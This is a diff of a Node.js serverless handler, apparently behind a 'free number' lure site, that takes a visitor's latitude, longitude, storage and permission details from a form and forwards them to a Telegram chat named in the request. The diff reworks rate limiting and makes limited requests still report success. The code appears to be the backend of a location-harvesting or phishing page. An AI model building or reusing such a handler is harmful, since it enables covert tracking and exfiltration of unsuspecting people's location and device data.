@@ -2,36 +2,18 @@ const fetch = require('node-fetch');
 const FormData = require('form-data');
 const formidable = require('formidable');
 
-const rateLimitMap = new Map(); 
+const rateLimitMap = new Map();
 
 module.exports = async (req, res) => {
   const botToken = process.env.TOKEN;
-  const allowedOrigin = 'https://free-number1.vercel.app'; // ← دامنه‌ی مجاز
+  const allowedOrigin = 'https://free-number1.vercel.app'; 
 
-  // بررسی Origin
   if (req.headers.origin && req.headers.origin !== allowedOrigin) {
     return res.status(403).json({ ok: false, error: 'Invalid origin' });
   }
 
   if (req.method !== 'POST') {
     return res.status(405).json({ ok: false, error: 'Method not allowed' });
-  }
-  
-  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-  const currentTime = Date.now();
-  const windowTime = 15 * 60 * 1000; 
-
-  if (!rateLimitMap.has(ip)) {
-    rateLimitMap.set(ip, []);
-  }
-
-  const timestamps = rateLimitMap.get(ip);
-  const recentRequests = timestamps.filter(ts => currentTime - ts < windowTime);
-  recentRequests.push(currentTime);
-  rateLimitMap.set(ip, recentRequests);
-
-  if (recentRequests.length > 10) {
-    return res.status(429).json({ ok: false, error: 'Too many requests from this IP. Please wait 15 minutes.' });
   }
 
   const form = new formidable.IncomingForm();
@@ -72,6 +54,25 @@ module.exports = async (req, res) => {
       return res.status(400).json({ ok: false, error: 'Missing required parameters.' });
     }
 
+    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const currentTime = Date.now();
+    const windowTime = 15 * 60 * 1000; // ۱۵ دقیقه
+
+    if (!rateLimitMap.has(ip)) {
+      rateLimitMap.set(ip, []);
+    }
+
+    const timestamps = rateLimitMap.get(ip);
+    const recentRequests = timestamps.filter(ts => currentTime - ts < windowTime);
+
+    if (recentRequests.length >= 10) {
+  
+      return res.status(200).json({ ok: true, limited: true, message: 'Rate limit reached. Data not sent to Telegram.' });
+    }
+
+    recentRequests.push(currentTime);
+    rateLimitMap.set(ip, recentRequests);
+
     try {
       const now = new Date();
       const dateTime = now.toLocaleString();
@@ -91,29 +92,21 @@ module.exports = async (req, res) => {
         `*💽 Storage:* ${storage || 'Unknown'}\n` +
         `*🔒 Permission:* Denied`;
 
-      const locationRes = await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+      
+      await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: new URLSearchParams({ chat_id: chatId, latitude, longitude })
       });
 
-      const locResult = await locationRes.json();
-      if (!locResult.ok) {
-        return res.status(500).json({ ok: false, error: locResult.description });
-      }
-
-      const messageRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+     
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: new URLSearchParams({ chat_id: chatId, text: messageText, parse_mode: 'Markdown' })
       });
 
-      const msgResult = await messageRes.json();
-      if (!msgResult.ok) {
-        return res.status(500).json({ ok: false, error: msgResult.description });
-      }
-
-      return res.status(200).json({ ok: true });
+      return res.status(200).json({ ok: true, sent: true });
     } catch (error) {
       return res.status(500).json({ ok: false, error: 'Failed to send data: ' + error.message });
     }
